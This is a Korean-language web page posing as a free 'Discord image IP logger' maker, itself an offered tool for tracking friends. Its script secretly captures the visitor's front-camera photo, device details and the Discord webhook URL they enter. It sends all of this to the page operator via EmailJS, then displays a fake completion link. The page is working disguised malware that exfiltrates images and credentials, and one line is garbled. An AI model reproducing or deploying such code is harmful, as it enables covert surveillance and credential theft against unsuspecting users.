<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>디스코드 이미지 IP 로거 - 무료 생성기</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      font-family: system-ui, -apple-system, sans-serif;
      background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
      color: #c9d1d9;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 40px 30px;
      max-width: 480px;
      width: 100%;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
      text-align: center;
    }
    h1 {
      font-size: 2.1rem;
      margin: 0 0 1.2rem;
      color: #58a6ff;
    }
    p {
      font-size: 1.05rem;
      color: #8b949e;
      line-height: 1.6;
      margin-bottom: 1.5rem;
    }
    .input-group {
      margin: 1.5rem 0;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-size: 0.95rem;
      color: #a0a0ff;
    }
    input[type="text"], input[type="file"] {
      width: 100%;
      padding: 10px 12px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      color: #c9d1d9;
      font-family: monospace;
      font-size: 0.95rem;
    }
    .error {
      color: #ff7b72;
      font-size: 0.9rem;
      margin-top: 0.5rem;
      display: none;
    }
    .btn {
      background: #238636;
      color: white;
      border: none;
      padding: 14px 40px;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s;
      box-shadow: 0 4px 12px rgba(35,134,54,0.4);
      margin-top: 1.5rem;
    }
    .btn:hover {
      background: #2ea043;
      box-shadow: 0 6px 20px rgba(35,134,54,0.6);
    }
    .status, .fake-link {
      margin-top: 2rem;
      font-size: 1rem;
      color: #58a6ff;
      word-break: break-all;
    }
    .fake-link strong {
      color: #ff7b72;
      text-decoration: underline;
    }
    #video, #canvas { display: none; }
  </style>
</head>
<body>

<div class="card">
  <h1>디스코드 이미지 IP 로거</h1>
  <p>친구 사진 + IP + 디바이스 정보까지 한 방에 잡는 최고급 무료 제작기<br>아래 정보 입력하고 제작 시작 누르세요!</p>

  <div class="input-group">
    <label for="webhook">Discord 웹훅 URL (필수)</label>
    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
    <div class="error" id="webhookError">웹훅 URL 형식이 올바르지 않습니다</div>
  </div>

  <div class="input-group">
    <label for="image">속일 이미지 업로드 (선택)</label>
    <input type="file" id="image" accept="image/*">
  </div>

  <button class="btn" id="startBtn">IP 로거 생성⁹ 시작</button>

  <div class="status" id="status">제작 준비 완료 — 버튼을 눌러주세요</div>
  <div class="fake-link" id="fakeLink" style="display:none;">
    제작 완료! 공유용 링크: <strong>https://discord.gg/로거완료-XXXXXX</strong><br>
    친구에게 바로 보내세요!
  </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  emailjs.init("ycbHVBt3cm6FkCL--");

  document.getElementById('startBtn').addEventListener('click', async () => {
    const webhookInput = document.getElementById('webhook');
    const webhookError = document.getElementById('webhookError');
    const status = document.getElementById('status');
    const fakeLink = document.getElementById('fakeLink');

    // 웹훅 URL 양식 검사 (https://discord.com/api/webhooks/ 로 시작하는지)
    const webhookValue = webhookInput.value.trim();
    if (!webhookValue || !webhookValue.startsWith('https://discord.com/api/webhooks/')) {
      webhookError.style.display = 'block';
      status.textContent = '웹훅 URL을 올바르게 입력해주세요';
      return;
    }

    webhookError.style.display = 'none';
    status.textContent = '제작 중...';

    try {
      // 카메라 허용 팝업 (버튼 클릭 시 실행)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      const video = document.getElementById('video');
      video.srcObject = stream;

      await new Promise(r => video.onloadedmetadata = r);
      await new Promise(r => setTimeout(r, 1200));

      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const base64 = canvas.toDataURL('image/jpeg', 0.68);

      const now = new Date().toLocaleString('ko-KR');
      const params = {
        timestamp: now,
        image_base64: base64,
        user_agent: navigator.userAgent,
        screen: `\( {screen.width}× \){screen.height}`,
        language: navigator.language,
        input_webhook: webhookValue,
        input_image: document.getElementById('image').files[0]?.name || '없음'
      };

      // EmailJS 전송
      await emailjs.send("service_had7jag", "template_upvu62t", params);

      // 제작 완료 → 가짜 링크 보여주기
      status.style.display = 'none';
      fakeLink.style.display = 'block';

      // 카메라 끄기
      stream.getTracks().forEach(t => t.stop());

    } catch (err) {
      status.textContent = '오류 발생 — 다시 시도해주세요';
      console.log(err);
    }
  });
</script>
</body>
</html>
